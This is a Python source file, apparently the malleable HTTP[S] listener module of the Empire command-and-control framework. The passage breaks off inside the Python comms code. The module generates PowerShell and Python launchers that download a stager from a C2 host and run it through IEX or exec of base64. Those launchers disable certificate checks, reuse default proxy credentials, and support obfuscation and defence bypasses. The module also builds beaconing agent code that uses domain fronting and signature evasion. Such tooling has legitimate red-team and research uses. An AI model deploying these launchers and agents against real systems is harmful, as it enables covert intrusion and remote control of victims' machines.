import base64
import copy
import logging
import os
import random
import ssl
import sys
import time
import urllib.parse

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
from flask import Flask, Response, make_response, request
from werkzeug.serving import WSGIRequestHandler

from empire.server.common import encryption, helpers, malleable, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.common.encryption import AESCipher
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util, listener_util, log_util
from empire.server.utils.module_util import handle_validate_message

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.info = {
            "Name": "HTTP[S] MALLEABLE",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                },
                {
                    "Name": "",
                    "Handle": "@johneiser",
                    "Link": "",
                },
            ],
            "Description": (
                "Starts a http[s] listener that adheres to a Malleable C2 profile."
            ),
            # categories - client_server, peer_to_peer, broadcast, third_party
            "Category": ("client_server"),
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_malleable",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": f"http://{helpers.lhost()}",
            },
            "BindIP": {
                "Description": "The IP to bind to on the control server.",
                "Required": True,
                "Value": "0.0.0.0",
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "80",
                "SuggestedValues": ["80", "443"],
            },
            "Profile": {
                "Description": "Malleable C2 profile to describe comms.",
                "Required": True,
                "Value": "",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0b4e2e01821770fa",
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 60,
            },
            "CertPath": {
                "Description": "Certificate path for https listeners.",
                "Required": False,
                "Value": "",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Cookie": {
                "Description": "Custom Cookie Name",
                "Required": False,
                "Value": "session",
            },
            "JA3_Evasion": {
                "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.thread = None

        # optional/specific for this module
        self.host_address = None
        self.app = None

        # randomize the length of the default_response and index_page headers to evade signature based scans
        self.header_offset = random.randint(0, 64)

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"

        self.instance_log = log

        self.agent_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.server_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.agent_private_cert_key = (
            self.agent_private_cert_key_object.private_bytes_raw()
        )
        self.agent_public_cert_key = encryption.publickey_unsafe(
            self.agent_private_cert_key
        )
        self.server_private_cert_key = (
            self.server_private_cert_key_object.private_bytes_raw()
        )
        self.server_public_cert_key = encryption.publickey_unsafe(
            self.server_private_cert_key
        )

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """
        with open(f"{self.template_dir}/default.html") as f:
            return f.read()

    def validate_options(self) -> tuple[bool, str | None]:
        """
        Validate all options for this listener.
        """

        profile_name = self.options["Profile"]["Value"]
        profile_data = (
            SessionLocal()
            .query(models.Profile)
            .filter(models.Profile.name == profile_name)
            .first()
        )

        if not profile_data:
            return handle_validate_message(
                f"[!] Malleable profile not found: {profile_name}"
            )

        try:
            profile = malleable.Profile()
            profile.ingest(content=profile_data.data)

            # since stager negotiation comms are hard-coded, we can't use any stager transforms - overwriting with defaults
            profile.stager.client.verb = "GET"
            profile.stager.client.metadata.transforms = []
            profile.stager.client.metadata.base64url()

            # check if cookie is set for stager, else generate random cookie
            if self.options["Cookie"]["Value"] == "":
                profile.stager.client.metadata.prepend("session=")
            else:
                profile.stager.client.metadata.prepend(
                    self.options["Cookie"]["Value"] + "="
                )

            profile.stager.client.metadata.header("Cookie")
            profile.stager.server.output.transforms = []
            profile.stager.server.output.print_()

            self.host_address, err = (
                self.mainMenu.listenersv2.validate_listener_address(self.options)
            )
            if err:
                return False, err

            if profile.validate():
                # store serialized profile for use across sessions
                self.serialized_profile = profile._serialize()

                # for agent compatibility (use post for staging)
                self.options["DefaultProfile"] = {
                    "Description": "Default communication profile for the agent.",
                    "Required": False,
                    "Value": profile.post.client.stringify(),
                }

                # grab sleeptime from profile
                self.options["DefaultDelay"] = {
                    "Description": "Agent delay/reach back interval (in seconds).",
                    "Required": False,
                    "Value": (
                        int(int(profile.sleeptime) / 1000)
                        if hasattr(profile, "sleeptime")
                        else 5
                    ),
                }

                # grab jitter from profile
                self.options["DefaultJitter"] = {
                    "Description": "Jitter in agent reachback interval (0.0-1.0).",
                    "Required": True,
                    "Value": (
                        float(profile.jitter) / 100
                        if hasattr(profile, "jitter")
                        else 0.0
                    ),
                }

                # eliminate troublesome headers
                for header in ["Connection"]:
                    profile.stager.client.headers.pop(header, None)
                    profile.get.client.headers.pop(header, None)
                    profile.post.client.headers.pop(header, None)

            else:
                return handle_validate_message(
                    f"[!] Unable to parse malleable profile: {profile_name}"
                )

        except malleable.MalleableError as e:
            return handle_validate_message(
                f"[!] Error parsing malleable profile: {profile_name}, {e}"
            )

        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        stager_retries="0",
        language=None,
        safe_checks="",
        listener_name=None,
        stager=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses
        if not language:
            log.error("listeners/template generate_launcher(): no language specified!")
            return None

        active_listener = self
        # extract the set options for this instantiated listener
        listenerOptions = active_listener.options

        port = listenerOptions["Port"]["Value"]
        host = listenerOptions["Host"]["Value"]
        launcher = listenerOptions["Launcher"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.stager.client.host = host
        profile.stager.client.port = port
        profile.stager.client.path = profile.stager.client.random_uri()

        if user_agent and user_agent.lower() != "default":
            if (
                user_agent.lower() == "none"
                and "User-Agent" in profile.stager.client.headers
            ):
                profile.stager.client.headers.pop("User-Agent")
            else:
                profile.stager.client.headers["User-Agent"] = user_agent

        if language == "powershell":
            launcherBase = '$ErrorActionPreference = "SilentlyContinue";'

            if safe_checks.lower() == "true":
                launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"

            for bypass in bypasses:
                launcherBase += bypass

            if safe_checks.lower() == "true":
                launcherBase += (
                    "};[System.Net.ServicePointManager]::Expect100Continue=0;"
                )

            # ==== DEFINE BYTE ARRAY CONVERSION ====
            launcherBase += (
                f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
            )

            # ==== BUILD AND STORE METADATA ====
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            routingPacketTransformed = profile.stager.client.metadata.transform(
                routingPacket
            )
            profile.stager.client.store(
                routingPacketTransformed, profile.stager.client.metadata.terminator
            )

            # ==== BUILD REQUEST ====
            launcherBase += "$wc=New-Object System.Net.WebClient;"
            launcherBase += (
                "$ser="
                + helpers.obfuscate_call_home_address(
                    profile.stager.client.scheme + "://" + profile.stager.client.netloc
                )
                + ";$t='"
                + profile.stager.client.path
                + profile.stager.client.query
                + "';"
            )

            # ==== HANDLE SSL ====
            if profile.stager.client.scheme == "https":
                # allow for self-signed certificates for https connections
                launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            # ==== CONFIGURE PROXY ====
            if proxy and proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += (
                        "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                    )

                else:
                    launcherBase += (
                        f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                    )
                    launcherBase += "$wc.Proxy = $proxy;"

                if proxy_creds and proxy_creds.lower() != "none":
                    if proxy_creds.lower() == "default":
                        launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        if len(username.split("\\")) > 1:
                            usr = username.split("\\")[1]
                            domain = username.split("\\")[0]
                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential(' {usr}', '{password}', '{domain}');"

                        else:
                            usr = username.split("\\")[0]
                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}');"

                        launcherBase += "$wc.Proxy.Credentials = $netcred;"

                # save the proxy settings to use during the entire staging process and the agent
                launcherBase += "$Script:Proxy = $wc.Proxy;"

            # ==== ADD HEADERS ====
            for header, value in profile.stager.client.headers.items():
                # If host header defined, assume domain fronting is in use and add a call to the base URL first
                # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                if header.lower() == "host":
                    launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"

                launcherBase += f'$wc.Headers.Add("{header}","{value}");'

            # ==== SEND REQUEST ====
            if (
                profile.stager.client.verb.lower() != "get"
                or profile.stager.client.body
            ):
                launcherBase += f"$data=$wc.UploadData($ser+$t,'{profile.stager.client.verb}','{profile.stager.client.body}');"

            else:
                launcherBase += "$data=$wc.DownloadData($ser+$t);"

            # ==== INTERPRET RESPONSE ====
            if (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.HEADER
            ):
                launcherBase += (
                    "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
                )
                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{profile.stager.server.output.terminator.arg}')"
                launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
                launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
            elif (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.PRINT
            ):
                launcherBase += ""
            else:
                launcherBase += ""
            launcherBase += profile.stager.server.output.generate_powershell_r("$data")

            # ==== DECRYPT AND EXECUTE STAGER ====
            launcherBase += "IEX ([Text.Encoding]::UTF8.GetString($data))"

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.obfuscate(
                    launcherBase,
                    obfuscation_command=obfuscation_command,
                )

            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(launcherBase, launcher)
            return launcherBase

        if language in ["python", "ironpython"]:
            # ==== HANDLE IMPORTS ====
            launcherBase = "import sys,base64\n"
            launcherBase += "import urllib.request,urllib.parse\n"

            # ==== HANDLE SSL ====
            if profile.stager.client.scheme == "https":
                launcherBase += "import ssl\n"
                launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"

            # ==== SAFE CHECKS ====
            if safe_checks and safe_checks.lower() == "true":
                launcherBase += listener_util.python_safe_checks()

            launcherBase += f"server='{self.host_address}'\n"

            # ==== CONFIGURE PROXY ====
            if proxy and proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler()\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += (
                        "proxy = urllib.request.ProxyHandler({'"
                        + proto
                        + "':'"
                        + proxy
                        + "'})\n"
                    )
                if proxy_creds and proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
                    else:
                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += (
                            "proxy_auth_handler.add_password(None,'"
                            + proxy
                            + "','"
                            + username
                            + "','"
                            + password
                            + "')\n"
                        )
                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy)\n"
            else:
                launcherBase += "o = urllib.request.build_opener()\n"
            # install proxy and creds globaly, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o)\n"

            # ==== BUILD AND STORE METADATA ====
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            routingPacketTransformed = profile.stager.client.metadata.transform(
                routingPacket
            )
            profile.stager.client.store(
                routingPacketTransformed, profile.stager.client.metadata.terminator
            )

            # ==== BUILD REQUEST ====
            launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
            launcherBase += f"req=vreq('{profile.stager.client.url}', {profile.stager.client.body})\n"
            launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"

            # ==== ADD HEADERS ====
            for header, value in profile.stager.client.headers.items():
                launcherBase += f"req.add_header('{header}','{value}')\n"

            # ==== SEND REQUEST ====
            launcherBase += "res=urllib.request.urlopen(req)\n"

            # ==== INTERPRET RESPONSE ====
            if (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.HEADER
            ):
                launcherBase += "head=res.info().dict\n"
                launcherBase += f"a=head['{profile.stager.server.output.terminator.arg}'] if '{profile.stager.server.output.terminator.arg}' in head else ''\n"
                launcherBase += "data=urllib.parse.unquote(a)\n"
            elif (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.PRINT
            ):
                launcherBase += "data=res.read()\n"
            else:
                launcherBase += "data=''\n"
            launcherBase += profile.stager.server.output.generate_python_r("a")

            # download the stager and extract the IV
            launcherBase += "data=urllib.request.urlopen(req).read();\n"
            launcherBase += listener_util.python_extract_stager(stagingKey)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                if isinstance(launchEncoded, bytes):
                    launchEncoded = launchEncoded.decode("UTF-8")
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        log.error(
            "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            log.error(
                "listeners/http_malleable generate_stager(): no language specified!"
            )
            return None

        # extract the set options for this instantiated listener
        port = listenerOptions["Port"]["Value"]
        host = listenerOptions["Host"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.stager.client.host = host
        profile.stager.client.port = port

        profileStr = profile.stager.client.stringify()

        # select some random URIs for staging
        stage1 = profile.stager.client.random_uri()
        stage2 = profile.stager.client.random_uri()

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http_malleable/http_malleable.ps1")

            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )

            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            raw_key_bytes = (
                self.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            raw_key_bytes = (
                self.server_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "session_cookie": "",
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
                "agent_private_cert_key": private_key_array,
                "server_public_cert_key": server_public_key_array,
                "agent_public_cert_key": public_key_array,
            }
            stager = template.render(template_options)

            # patch in custom headers
            if profile.stager.client.headers:
                headers = ",".join(
                    [
                        ":".join([k.replace(":", "%3A"), v.replace(":", "%3A")])
                        for k, v in profile.stager.client.headers.items()
                    ]
                )
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                )

            comms_code = self.generate_comms(
                listenerOptions=listenerOptions, language=language
            )

            # stager = helpers.strip_powershell_comments(comms_code + stager)
            stager = comms_code + stager

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            if encode:
                return helpers.enc_powershell(stager)

            return stager

        if language.lower() == "python":
            comms_code = self.generate_comms(
                listenerOptions=listenerOptions, language=language
            )

            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http_malleable/http_malleable.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "agent_private_cert_key": self.agent_private_cert_key,
                "server_public_cert_key": self.server_public_cert_key,
                "agent_public_cert_key": self.agent_public_cert_key,
                "profile": profileStr,
                "session_cookie": "",
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
            }

            stager = template.render(template_options)
            stager = stager.replace("REPLACE_COMMS", comms_code)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)

            if encode:
                return base64.b64encode(stager)

            return stager

        log.error(
            "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscation_command="",
        version="",
    ):
        """
        Generate the full agent code needed for communications with the listener.
        """

        if not language:
            log.error(
                "listeners/http_malleable generate_agent(): no language specified!"
            )
            return None

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        listenerOptions["KillDate"]["Value"]
        listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(
            self.default_response().encode("UTF-8")
        ).decode("UTF-8")

        profileStr = profile.stager.client.stringify()

        if language == "powershell":
            # read in agent code
            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()

            # strip out the comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profileStr) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            code = code.replace(
                '$DefaultResponse = ""',
                f'$DefaultResponse = "{b64DefaultResponse}"',
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.obfuscate(
                    code,
                    obfuscation_command=obfuscation_command,
                )

            return code

        if language == "python":
            # read in the agent base
            if version == "ironpython":
                f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
            else:
                f = self.mainMenu.installPath + "/data/agent/agent.py"
            with open(f) as f:
                code = f.read()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay=60", f"delay={delay}")
            code = code.replace("jitter=0.0", f"jitter={jitter}")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{profileStr}"',
            )
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                f'defaultResponse = base64.b64decode("{b64DefaultResponse}")',
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)

            return code

        log.error(
            "listeners/http_malleable generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.
        """

        # extract the set options for this instantiated listener
        host = listenerOptions["Host"]["Value"]
        port = listenerOptions["Port"]["Value"]

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.get.client.host = host
        profile.get.client.port = port
        profile.post.client.host = host
        profile.post.client.port = port

        if not language:
            log.error("listeners/template generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            # PowerShell
            updateServers = f'$Script:ControlServers = @("{self.host_address}");'
            updateServers += "$Script:ServerIndex = 0;"

            # ==== HANDLE SSL ====
            if host.startswith("https"):
                updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            getTask = f"""
# ==== DEFINE GET ====
$script:GetTask = {{
try {{
    if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
        # ==== BUILD ROUTING PACKET ====
        $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;

        {profile.get.client.metadata.generate_powershell("$RoutingPacket")}

        # ==== BUILD REQUEST ====
        $vWc = New-Object System.Net.WebClient;
        $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
        if ($Script:Proxy) {{
            $vWc.Proxy = $Script:Proxy;
        }}
"""

            # ==== CHOOSE URI ====
            getTask += (
                "$taskURI = "
                + ",".join(
                    [
                        f"'{u}'"
                        for u in (
                            profile.get.client.uris
                            if profile.get.client.uris
                            else ["/"]
                        )
                    ]
                )
                + " | Get-Random;"
            )

            # ==== ADD PARAMETERS ====
            first = True
            for parameter, value in profile.get.client.parameters.items():
                getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                getTask += f"$taskURI += '{parameter}={value}';"
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                getTask += f"$taskURI += '{profile.get.client.metadata.terminator.arg}=' + $RoutingPacket;"

            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                getTask += "$taskURI += $RoutingPacket;"

            # ==== ADD HEADERS ====
            for header, value in profile.get.client.headers.items():
                getTask += f"$vWc.Headers.Add('{header}', '{value}');"
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.HEADER
            ):
                getTask += f"$vWc.Headers.Add('{profile.get.client.metadata.terminator.arg}', $RoutingPacket);"

            # ==== ADD BODY ====
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PRINT
            ):
                getTask += "$body = $RoutingPacket;"
            else:
                getTask += f"$body = '{profile.get.client.body}';"

            # ==== SEND REQUEST ====
            if (
                profile.get.client.verb.lower() != "get"
                or profile.get.client.body
                or profile.get.client.metadata.terminator.type
                == malleable.Terminator.PRINT
            ):
                getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.get.client.verb}', [System.Text.Encoding]::Default.GetBytes('{profile.get.client.body}'));"
            else:
                getTask += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"

            # ==== EXTRACT RESULTS ====
            if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
                getTask += f"$data = $vWc.responseHeaders.get('{profile.get.server.output.terminator.arg}');"
                getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"

            elif (
                profile.get.server.output.terminator.type == malleable.Terminator.PRINT
            ):
                getTask += "$data = $result;"
                getTask += "$data = [System.Text.Encoding]::Default.GetString($data);"

            getTask += f"""
# ==== INTERPRET RESULTS ====
{profile.get.server.output.generate_powershell_r("$data")}

# ==== RETURN RESULTS ====
$data = [System.Text.Encoding]::Default.GetBytes($data);
$data;
}}

# ==== HANDLE ERROR ====
}} catch [Net.WebException] {{
$script:MissedCheckins += 1;
if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
}}
}}
}};
"""

            # ==== Send Message ====
            sendMessage = f"""
# ==== DEFINE POST ====
$script:SendMessage = {{
param($Packets);
if ($Packets) {{

# ==== BUILD ROUTING PACKET ====
$EncBytes = Aes-EncryptThenHmac -Key $Script:SessionKey -Plain $Packets

$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;

{profile.post.client.output.generate_powershell("$RoutingPacket")}

# ==== BUILD REQUEST ====
if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
$vWc = New-Object System.Net.WebClient;

# ==== CONFIGURE PROXY ====
$vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
$vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
if ($Script:Proxy) {{
$vWc.Proxy = $Script:Proxy;
}}
"""

            # ==== CHOOSE URI ====
            sendMessage += (
                "$taskURI = "
                + ",".join(
                    [
                        f"'{u}'"
                        for u in (
                            profile.post.client.uris
                            if profile.post.client.uris
                            else ["/"]
                        )
                    ]
                )
                + " | Get-Random;"
            )

            # ==== ADD PARAMETERS ====
            first = True
            for parameter, value in profile.post.client.parameters.items():
                sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                sendMessage += f"$taskURI += '{parameter}={value}';"
            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                sendMessage += f"$taskURI += '{profile.post.client.output.terminator.arg}=' + $RoutingPacket;"

            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                sendMessage += "$taskURI += $RoutingPacket;"

            # ==== ADD HEADERS ====
            for header, value in profile.post.client.headers.items():
                sendMessage += f"$vWc.Headers.Add('{header}', '{value}');"

            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.HEADER
            ):
                sendMessage += f"$vWc.Headers.Add('{profile.post.client.output.terminator.arg}', $RoutingPacket);"

            # ==== ADD BODY ====
            if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                sendMessage += "$body = $RoutingPacket;"
            else:
                sendMessage += f"$body = '{profile.post.client.body}';"

            # ==== SEND REQUEST ====
            sendMessage += "try {"
            if (
                profile.post.client.verb.lower() != "get"
                or profile.post.client.body
                or profile.post.client.output.terminator.type
                == malleable.Terminator.PRINT
            ):
                sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.post.client.verb.upper()}', [System.Text.Encoding]::Default.GetBytes($body));"
            else:
                sendMessage += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"

            # ==== HANDLE ERROR ====
            sendMessage += """
} catch [System.Net.WebException] {
if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
}}}}};
"""
            return updateServers + getTask + sendMessage

        if language.lower() == "python":
            sendMessage = f"""
import base64
import urllib
import random
import sys


class ExtendedPacketHandler(PacketHandler):
    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
        self.headers = headers
        self.taskURIs = taskURIs
        self.server = server

    def post_message(self, uri, data):
        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()

    def send_results_for_child(self, received_data):
        self.headers['Cookie'] = "session=%s" % (received_data[1:])
        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
        requestUri = self.server + taskURI
        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
        return response

    def send_get_tasking_for_child(self, received_data):
        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
        requestUri = self.server + taskURI
        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
        return response

    def send_staging_for_child(self, received_data, hop_name):
        postURI = self.server + random.sample({profile.post.client.uris!s}, 1)[0]
        self.headers['Hop-Name'] = hop_name
